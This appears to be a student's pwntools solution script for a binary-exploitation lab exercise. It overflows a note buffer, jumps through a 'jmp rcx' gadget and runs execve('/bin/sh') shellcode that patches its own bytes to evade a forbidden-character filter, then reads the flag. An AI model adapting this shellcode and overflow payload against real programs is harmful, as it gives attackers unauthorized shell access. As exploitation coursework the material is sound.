#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise6/exercise6b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break add_note+0x27
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
jmp = 0x401616 # jmp rcx

# Illegal chars --> from Ghidra FORBIDDEN_CHARS[32]:
# 05 0a 0d 0f 1e 82 8b 91 95 99 1e a4 a6 a9 cd d2 e6 f6 bc be bf c3 c4 cb cf d4 d6 db e0 e9 f3 ff

# push 59
# pop rax
# cdq
# push rdx
# mov rbx, 0x68732f6e69622f2f
# push rbx
# push rsp
# pop rdi
# push rdx
# push rdi
# push rsp
# pop rsi
# syscall

# print("push 59", asm("push 59"))
# print("pop rax", asm("pop rax"))
# print("cdq", asm("cdq")) !!
# print("push rdx", asm("push rdx"))
# print("mov rbx, 0x68732f6e69622f2f", asm("mov rbx, 0x68732f6e69622f2f"))
# print("push rbx", asm("push rbx"))
# print("push rsp", asm("push rsp"))
# print("pop rdi", asm("pop rdi"))
# print("push rdx", asm("push rdx"))
# print("push rdi", asm("push rdi"))
# print("push rsp", asm("push rsp"))
# print("pop rsi", asm("pop rsi"))
# print("syscall", asm("syscall")) !!

start = """
push 59
pop rax
"""
payload = asm(start)

obtain = 0x9099 # nop + cdq
safe = 0x3131
diff = obtain - safe
fix_asm_len = 6
fix_asm = asm(f"add word ptr [rcx + {len(payload) + fix_asm_len}], {hex(diff)}") 
assert fix_asm_len == len(fix_asm)

payload += fix_asm + b'\x31\x31'

middle = """
push rdx
mov rbx, 0x68732f6e69622f2f
push rbx
push rsp
pop rdi
push rdx
push rdi
push rsp
pop rsi
"""
payload += asm(middle)

obtain = 0x050f # syscall
safe = 0x3131
diff = safe - obtain
fix_asm_len = 6
fix_asm = asm(f"sub word ptr [rcx + {len(payload) + fix_asm_len}], {hex(diff)}") 
assert fix_asm_len == len(fix_asm)

payload += fix_asm + b'\x31\x31'

r.recvline(b'notes:\n')
r.sendline(b'1')

r.recvuntil(b'note:\n')
r.sendline((b'A' * 8) + payload + (b'\x90' * (232 + 6*4 - len(payload))) + p64(jmp))

r.sendline(b'cat flag')
r.sendline(b'exit')
print(r.recvall())
